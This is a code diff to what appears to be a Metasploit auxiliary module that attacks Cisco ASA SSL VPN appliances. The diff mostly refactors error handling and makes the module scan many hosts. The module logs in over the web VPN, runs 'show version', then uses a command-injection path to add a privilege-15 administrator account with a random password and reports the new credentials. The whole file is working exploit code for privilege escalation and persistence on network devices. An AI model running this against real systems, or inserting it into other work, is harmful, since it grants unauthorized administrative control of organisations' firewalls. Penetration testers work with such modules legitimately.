@@ -51,21 +51,18 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
-  # Verify whether the connection is working or not
-  def validate_connection
+  def validate_cisco_ssl_vpn
     begin
       res = send_request_cgi(
               'uri' => '/',
               'method' => 'GET'
             )
 
-      print_good("#{peer} - Server is responsive")
+      print_good "#{peer} - Server is responsive"
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      fail_with(Failure::NoAccess, "#{peer} - Server is unresponsive")
+      return false
     end
-  end
 
-  def validate_cisco_ssl_vpn   
     res = send_request_cgi(
             'uri' => '/+CSCOE+/logon.html',
             'method' => 'GET'
@@ -84,10 +81,9 @@ class Metasploit3 < Msf::Auxiliary
     if res &&
        res.code == 200 &&
        res.body.include?('webvpnlogin')
-
-      print_good("#{peer} - Server is Cisco SSL VPN")
+      return true
     else
-      fail_with(Failure::NoAccess, "#{peer} - Server is not a Cisco SSL VPN")
+      return false
     end
   end
 
@@ -100,9 +96,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res &&
        res.code == 200
-      print_good("#{peer} - Logged out")
-    else
-      fail_with(Failure::NoAccess, "#{peer} - Attempted to logout, but failed")
+      print_good "#{peer} - Logged out"
     end
   end
 
@@ -132,53 +126,31 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('Cisco Adaptive Security Appliance Software Version')
         return resp.body
       else
-        print_good("#{peer} - Unable to run '#{command}'")
-        print_good("#{peer} - Retrying #{i} '#{command}'") unless i == 2
+        vprint_error "#{peer} - Unable to run '#{command}'" 
+        print_good "#{peer} - Retrying #{i} '#{command}'" unless i == 2
       end
     end
 
     return nil
   end
 
-  def get_config(cookie, tries = 10)
-    # Make up to three attempts because server can be a little flaky
-    tries.times do |i|
-      resp = send_request_cgi(
-               'uri' => "/admin/config",
-               'method' => 'GET',
-               'cookie' => cookie
-             )
-
-      if resp &&
-         resp.body.include?('ASA Version')
-        print_good("#{peer} - Got Config!!!")
-        return resp.body
-      else
-        print_good("#{peer} - Unable to grab config")
-        print_good("#{peer} - Retrying #{i} to grab config (technique 1)") unless i == tries - 1
-      end
-    end
-
-    return nil
-  end
-
-  def add_user(cookie, tries = 10)
+  def add_user(cookie, tries = 3)
     username = random_username()
     password = random_password()
 
     tries.times do |i|
-      print_good("#{peer} - Attemping to add User: #{username}, Pass: #{password}")
+      print_good "#{peer} - Attemping to add User: #{username}, Pass: #{password}"
       command = "username #{username} password #{password} privilege 15"
       resp = run_command(command, cookie)
 
       if resp &&
          !resp.body.include?('Command authorization failed') &&
          !resp.body.include?('Command failed')
-        print_good("#{peer} - Privilege Escalation Appeared Successful")
+        print_good "#{peer} - Privilege Escalation Appeared Successful" 
         return [username, password]
       else
-        print_good("#{peer} - Unable to run '#{command}'")
-        print_good("#{peer} - Retrying #{i} '#{command}'") unless i == tries - 1
+        vprint_error "#{peer} - Unable to run '#{command}'"
+        print_good "#{peer} - Retrying #{i} '#{command}'" unless i == tries - 1
       end
     end
 
@@ -230,29 +202,29 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('SSL VPN Service') &&
          resp.body.include?('webvpn_logout')
 
-        print_good("#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
+        print_good "#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}"
         return resp.get_cookies
       else
-        fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate, check username/password/group")
+        return false
       end
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      fail_with(Failure::NoAccess, "#{peer} - HTTP Connection Failed, Aborting")
+      return false
     end
   end
 
-  def exploit
-    # Validate we have a valid connection
-    validate_connection()
-    
+  def run_host(ip)
     # Validate we're dealing with Cisco SSL VPN
-    validate_cisco_ssl_vpn()
+    unless validate_cisco_ssl_vpn()
+      vprint_error "#{peer} - Does not appear to be Cisco SSL VPN"
+      :abort
+    end 
 
     # This is crude, but I've found this to be somewhat 
     # interimittent based on session, so we'll just retry
     # 'X' times.
     datastore['RETRIES'].times do |i|
-      print_good("#{peer} - Exploit Attempt ##{i}")
+      print_good "#{peer} - Exploit Attempt ##{i}"
 
       # Authenticate to SSL VPN and get session cookie
       cookie = do_login(
@@ -261,24 +233,30 @@ class Metasploit3 < Msf::Auxiliary
                  datastore['GROUP']
                )
 
-      # Grab version
-      version = do_show_version(cookie, 1)
+      # See if our authentication attempt failed
+      unless cookie
+        vprint_error "#{peer} - Failed to login to Cisco SSL VPN"
+        next
+      end
 
-      if version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
-        print_good("#{peer} - Show version succeeded. Version is Cisco ASA #{version_match[1]}")
+      # Grab version
+      version = do_show_version(cookie)
+
+      if version &&
+         version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
+        print_good "#{peer} - Show version succeeded. Version is Cisco ASA #{version_match[1]}"
       else
         do_logout(cookie)
-        print_good("#{peer} - Show version failed")
+        vprint_error "#{peer} - Show version failed"
         next
       end
 
       # Attempt to add an admin user
-      creds = add_user(cookie, 1)
-
+      creds = add_user(cookie)
       do_logout(cookie)
 
       if creds
-        print_good("#{peer} - Successfully added level 15 account #{creds.join(", ")}")
+        print_good "#{peer} - Successfully added level 15 account #{creds.join(", ")}"
 
         user, pass = creds
 
@@ -294,7 +272,7 @@ class Metasploit3 < Msf::Auxiliary
 
         report_auth_info(report_hash)
       else
-        print_good("#{peer} - Failed to created user account")
+        vprint_error "#{peer} - Failed to created user account on Cisco SSL VPN"
       end
     end
   end
